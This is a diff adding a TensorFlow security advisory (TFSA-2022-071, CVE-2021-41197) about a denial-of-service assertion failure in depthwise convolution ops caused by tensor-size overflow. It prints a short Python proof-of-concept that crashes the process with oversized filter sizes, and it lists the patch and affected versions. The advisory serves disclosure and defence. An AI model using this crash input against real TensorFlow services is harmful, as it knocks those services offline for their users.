@@ -1,0 +1,21 @@
+<h2>TFSA-2022-071: <code>CHECK</code> failure in depthwise ops via overflows</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-41197</p>
+<h3>Impact</h3>
+<p>The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via <code>CHECK</code>-failure (assertion failure) caused by overflowing the number of elements in a tensor:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
+filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
+out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
+tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
+    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding="SAME")
+```</p>
+<p>This is another instance of <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md">TFSA-2021-198</a> (CVE-2021-41197).</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b">3796cc4fcd93ae55812a457abc96dcd55fbb854b</a>.</p>
+<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.</p>
